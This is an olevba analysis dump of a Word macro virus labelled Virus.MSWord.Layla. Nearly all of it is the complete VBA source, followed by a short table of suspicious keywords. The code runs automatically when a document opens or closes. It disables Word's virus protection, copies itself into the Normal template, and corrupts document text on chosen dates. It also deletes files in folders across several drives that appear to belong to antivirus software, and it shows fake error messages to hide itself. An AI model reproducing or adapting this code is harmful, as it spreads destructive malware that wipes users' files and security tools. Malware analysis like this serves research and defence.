olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Layla-fb345853113090cf92bac25e12087d00919ec9d4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Layla-fb345853113090cf92bac25e12087d00919ec9d4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO TJ.bas 
in file: Virus.MSWord.Layla-fb345853113090cf92bac25e12087d00919ec9d4 - OLE stream: 'Macros/VBA/TJ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error Resume Next
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
           Name:="NewMacros", Object:=wdOrganizerObjectProjectItems

On Error Resume Next
 Call LAYLA
If (Format(Now, "ss") = 27) Or (Format(Now, "ss") = 29) _
Then GoTo DEMO _
Else GoTo FINISH
DEMO:
Dim Chars, CharsNum
Chars = ActiveDocument.Range.ComputeStatistics(Statistic:=wdStatisticCharacters)
CharsNum = 0
Selection.Find.ClearFormatting
 With Selection.Find
   .Text = "^?"
   .Replacement.Text = " "
   .Forward = True
   .Wrap = wdFindContinue
   .Format = False
   .MatchCase = False
   .MatchWholeWord = False
   .MatchWildcards = False
   .MatchSoundsLike = False
   .MatchAllWordForms = False
 End With
For CharsNum = 29 To Chars
Selection.Find.Execute
If (CharsNum Mod 9) = 0 Then Selection.InsertSymbol Font:="Wingdings", CharacterNumber:=-4002, Unicode:=True
Next CharsNum

If ActiveDocument.Saved = False Then ActiveDocument.Save
ActiveDocument.Close

FINISH:
End Sub
Sub LAYLA()
'Tj presents... Hi from Samara !
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

On Error Resume Next
With Application
     .UserName = ""
     .UserInitials = "TJ_LAYLA"
     .UserAddress = ""
End With
ActiveDocument.ReadOnlyRecommended = False
KTO_ = 0
If MacroContainer = NormalTemplate Then KTO_ = 1
If KTO_ = 1 Then KTO = NormalTemplate.FullName Else KTO = ActiveDocument.FullName
If KTO_ = 1 Then KOGO = ActiveDocument.FullName Else KOGO = NormalTemplate.FullName
Application.OrganizerCopy Source:=KTO, Destination:=KOGO, Name:="TJ", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=KTO, Destination:=KOGO, Name:="TJFrm", Object:=wdOrganizerObjectProjectItems
If KTO_ = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If KTO_ = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
End Sub
Sub AutoExec()
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
On Error Resume Next
If Day(Now()) = 29 Or Day(Now()) = 27 Then StatusBar = "Excellent day... for me... :)"
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
On Error Resume Next
With Application
     .UserName = ""
     .UserInitials = "TJ_LAYLA"
     .UserAddress = ""
End With
End Sub
Sub AutoExit()
Application.StatusBar = "Saving..."
Path = "c:\"
Search:
DirName = Dir(Path, vbDirectory)
Do While DirName <> ""
    If DirName <> "." And DirName <> ".." Then
        If (GetAttr(Path & DirName) And vbDirectory) = vbDirectory _
        Then
          With Application.FileSearch
               .FileName = "*d*r*w*.*"
               .LookIn = Path & DirName
               .Execute
          For I = 1 To .FoundFiles.Count
           On Error Resume Next
           Kill Path & DirName & "\*.*"
           Next I
          End With
          With Application.FileSearch
               .FileName = "*a*v*p*.*"
               .LookIn = Path & DirName
               .Execute
          For I = 1 To .FoundFiles.Count
           On Error Resume Next
           Kill Path & DirName & "\*.avc"
           On Error Resume Next
           Kill Path & DirName & "\*.key"
           Next I
          End With
        End If
    End If
    DirName = Dir
Loop

Select Case Path
Case "c:\"
    Path = "c:\program files\"
    GoTo Search
Case "c:\program files\"
    Path = "d:\"
    GoTo Search
Case "d:\"
    Path = "e:\"
    GoTo Search
Case "e:\"
    GoTo Konets
End Select

Konets:
End Sub
Sub AutoClose()
On Error Resume Next
 Call FileClose
End Sub
Sub FileClose()
Dim Aries
GoTo Life

Death:
If Day(Now()) = 29 Then Aries = "Tj" Else Aries = "Layla"
StatusBar = "Ñîõðàíåíèå ôàéëà..."

Selection.Find.ClearFormatting
Selection.Find.Replacement.ClearFormatting
 With Selection.Find
  .Text = "^#"
  .Replacement.Text = Aries
  .Forward = True
  .Wrap = wdFindContinue
  .Format = False
  .MatchCase = False
  .MatchWholeWord = False
  .MatchWildcards = False
  .MatchSoundsLike = False
  .MatchAllWordForms = False
 End With
 Selection.Find.Execute Replace:=wdReplaceAll
GoTo Yes
Life:
 On Error Resume Next
 Call LAYLA
 If Day(Now()) = 29 Or Day(Now()) = 27 Then GoTo Death
Yes:
 If ActiveDocument.Saved = False Then ActiveDocument.Save
 ActiveDocument.Close
End Sub
Sub ToolsMacro()
    Dim MB
    On Error Resume Next
    MB = MsgBox("Can't find necessary library VB2903.DLL", 16, "Word Basic Error")
End Sub
Sub ToolsCustomize()
    Dim MB
    On Error Resume Next
    MB = MsgBox("Can't find necessary library VB2903.DLL", 16, "Word Basic Error")
End Sub
Sub FileTemplates()
    Dim MB
    On Error Resume Next
    MB = MsgBox("Can't find necessary library VB2903.DLL", 16, "Word Basic Error")
End Sub
Sub ViewVBCode()
    Dim MB
    On Error Resume Next
    MB = MsgBox("The program has executed invalid operation and will be closed", 16, "FATAL ERROR")
    Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|IOC       |VB2903.DLL          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

